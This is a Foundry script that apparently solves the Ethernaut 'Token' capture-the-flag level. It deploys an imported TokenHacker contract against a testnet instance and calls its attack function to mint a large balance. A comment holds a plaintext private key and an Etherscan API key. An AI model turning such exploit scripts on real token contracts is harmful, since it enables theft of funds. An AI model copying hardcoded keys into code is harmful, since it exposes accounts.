// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Token/TokenHacker.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Token.s.sol:TokenScript --rpc-url 'https://rpc.ankr.com/eth_rinkeby' --broadcast --private-key 'bbcdcf6c876839be76f70d4d2cecc1595c99dcb4bcdc9c964705f8c7a2d9ad16' --verify --etherscan-api-key '62UA4EJ6S43NHP4C5A7MSW1JSQF7GVV92N'
   
contract TokenScript is Script {
    function setUp() public {}

    function run() public {

        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        console.log("####2");
        TokenHacker hacker = new TokenHacker(0x8fa271ba5E1604cA0dA0BD7A6043c848A2fFDcc8);
        console.log(address(this));
        hacker.attack(msg.sender, 21000000);
        
        console.log("####3");
        vm.stopBroadcast();
        
        console.log("####4");
    }
}
